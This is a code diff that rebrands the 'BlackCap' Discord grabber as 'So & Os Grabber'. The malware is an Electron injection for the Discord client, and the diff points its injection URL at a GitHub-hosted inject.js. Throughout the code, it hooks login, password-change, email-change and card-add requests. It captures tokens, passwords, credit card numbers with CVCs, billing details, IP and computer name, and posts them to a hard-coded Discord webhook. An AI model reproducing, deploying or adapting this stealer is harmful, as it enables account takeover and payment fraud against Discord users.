@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "",
+    injection_url: "https://raw.githubusercontent.com/KaZerCfx/-ee/main/inject.js",
     webhook: "https://discord.com/api/webhooks/1200143308983373934/wvbEj219eBeAVZA0gnCwaqZgRY8n_BNUqoRx3znTcPttmT7amDVODvZwKf6t0brVe-qZ",
     Filter: {
         "urls": [
@@ -57,7 +57,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "BlackCap Grabber",
+        username: "So & Os Grabber",
         avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         content: "",
         embeds: [{
@@ -66,10 +66,10 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: "BlackCap"
+                name: "So & Os"
             },
             footer: {
-                text: "©KSCH | https://github.com/KSCHdsc"
+                text: "So & Os"
             },
 
         }]
@@ -258,7 +258,7 @@ const FirstTime = async () => {
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "BlackCap Initalized",
+            title: "So & Os Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
@@ -273,13 +273,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/blackcap%20(2).png"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/Banner.png"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "BlackCap Initalized",
+            title: "So & Os Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -314,7 +314,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>]`,
+                value: `[So & Os 2023 <a:blackcapgif:1041634542093619260>]`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -365,13 +365,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/blackcap%20(2).png"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/Banner.png"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "BlackCap Victim got logged out",
+                title: "So & Os Victim got logged out",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -406,7 +406,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>]`,
+                    value: `[So & Os 2023 <a:blackcapgif:1041634542093619260>]`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -528,8 +528,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/blackcap%20(2).png"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/Banner.png"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -540,7 +540,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "BlackCap User Login",
+                title: "So & Os User Login",
                 description: "[<a:blackcapgif:1041634542093619260>  **Oh you have So & Os someone**]",
                 color: config['embed-color'],
                 fields: [{
@@ -577,7 +577,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>]`,
+                    value: `[So & Os 2023 <a:blackcapgif:1041634542093619260>]`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -621,7 +621,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "BlackCap Detect Password Changed",
+                    title: "So & Os Detect Password Changed",
                     description: "[<a:blackcapgif:1041634542093619260>  **Oh you have So & Os someone**]",
                     color: config['embed-color'],
                     fields: [{
@@ -658,7 +658,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>]`,
+                        value: `[So & Os 2023 <a:blackcapgif:1041634542093619260>]`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -708,7 +708,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "BlackCap Detect Email Changed",
+                    title: "So & Os Detect Email Changed",
                     description: "[<a:blackcapgif:1041634542093619260>  **Oh you have So & Os someone**]",
                     color: config['embed-color'],
                     fields: [{
@@ -745,7 +745,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>]`,
+                        value: `[So & Os 2023 <a:blackcapgif:1041634542093619260>]`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -794,7 +794,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "BlackCap User Credit Card Added",
+                title: "So & Os User Credit Card Added",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
